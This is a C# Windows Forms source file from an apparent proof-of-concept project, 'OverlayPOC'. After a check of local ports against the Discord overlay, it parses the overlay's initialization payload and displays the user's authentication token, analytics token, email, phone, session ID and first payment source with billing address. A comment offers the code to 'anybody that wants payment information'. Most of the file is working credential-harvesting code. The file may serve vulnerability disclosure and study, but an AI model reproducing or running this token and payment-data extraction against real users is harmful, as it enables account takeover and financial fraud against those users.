using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Text.Json;

namespace OverlayPOC
{
    public partial class MainForm : Form
    {
        private delegate void SafeStatusDelegate(string status);
        private delegate void SafeEnabledDelegate(bool enabled);

        public MainForm()
        {
            InitializeComponent();
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            StartButton.Enabled = false;
            SetStatus("Working on it...");
            StatusLog.Text = null;
            CheckOverlay.CheckAllPorts(OverlayCallback);
        }

        private void OverlayCallback(List<OverlayResponse> responses)
        {
            foreach (OverlayResponse response in responses)
            {
                JsonElement states = response.StorageStates;
                JsonElement init = response.InitializePayload;
                AppendLog($"Entry for port {response.Port}");
                AppendLog($"\tStatus: {(response.Success == true ? "Active" : "Failed")}");
                if (response.Success == true)
                {
                    AppendLog($"\tUsing Discord {response.ReleaseChannel}");
                    AppendLog($"\tUsername: {init.GetProperty("user").GetProperty("username").GetString()}#{init.GetProperty("user").GetProperty("discriminator").GetString()}");
                    AppendLog($"\tUser ID: {init.GetProperty("user").GetProperty("id").GetString()}");
                    AppendLog($"\tGuilds: {init.GetProperty("guilds").GetArrayLength()}");
                    AppendLog($"\tUser token: {init.GetProperty("token").GetString()}");
                    AppendLog($"\tAnalytics token: {init.GetProperty("analyticsToken").GetString()}");
                    JsonElement email = init.GetProperty("user").GetProperty("email");
                    AppendLog($"\tUser email: {(email.ValueKind == JsonValueKind.Null ? "none linked" : email.GetString())}");
                    JsonElement phone = init.GetProperty("user").GetProperty("phone");
                    AppendLog($"\tUser phone: {(phone.ValueKind == JsonValueKind.Null ? "none linked" : phone.GetString())}");
                    AppendLog($"\tGateway session: {init.GetProperty("sessionId").GetString()}");
                    // why the hell does the overlay need to know payment info
                    bool paymentCached = init.GetProperty("hasFetchedPaymentSources").GetBoolean();
                    AppendLog($"\tPayment info cached? {paymentCached.ToString()}");
                    if (paymentCached)
                    {
                        JsonElement paymentSources = init.GetProperty("paymentSources");
                        int paymentSourcesSize = paymentSources.GetArrayLength();
                        AppendLog($"\tLinked payment sources: {paymentSourcesSize.ToString()}");
                        if (paymentSourcesSize > 0)
                        {
                            JsonElement firstPaymentSource = paymentSources[0];
                            JsonElement billingAddress = firstPaymentSource.GetProperty("billingAddress");
                            // longest line of code in the whole project incoming
                            // it could definitely be refactored but since this is only a proof of concept I'll leave it up to implementation for anybody that wants payment information
                            AppendLog($"\tFirst payment source: {firstPaymentSource.GetProperty("brand").GetString()} ****{firstPaymentSource.GetProperty("last4").GetString()} - Name: {billingAddress.GetProperty("name").GetString()} - Address: {billingAddress.GetProperty("line1").GetString()} {billingAddress.GetProperty("line2").GetString()} {billingAddress.GetProperty("city").GetString()} {billingAddress.GetProperty("state").GetString()} {billingAddress.GetProperty("country").GetString()} {billingAddress.GetProperty("postalCode").GetString()}");
                        }
                    }
                }
                AppendLog("\n");
            }
            SetStatus("Finished");
            SetButtonEnabled(true);
        }

        public static MainForm GetWindow()
        {
            MainForm win = null;
            foreach (object obj in Application.OpenForms)
            {
                Form form = (Form)obj;
                if (form != null && form.GetType().Name == "MainForm")
                {
                    win = (MainForm)form;
                    break;
                }
            }
            return win;
        }

        public void SetStatus(string status)
        {
            if (StatusText.InvokeRequired)
            {
                StatusText.Invoke(new SafeStatusDelegate(SetStatus), new object[] { status });
            }
            else
            {
                StatusText.Text = status;
            }
        }

        public void AppendLog(string status)
        {
            if (StatusLog.InvokeRequired)
            {
                StatusLog.Invoke(new SafeStatusDelegate(AppendLog), new object[] { status });
            }
            else
            {
                StatusLog.AppendText(status + "\n");
            }
        }

        public void SetButtonEnabled(bool enabled)
        {
            if (StartButton.InvokeRequired)
            {
                StartButton.Invoke(new SafeEnabledDelegate(SetButtonEnabled), new object[] { enabled });
            }
            else
            {
                StartButton.Enabled = enabled;
            }
        }
    }
}
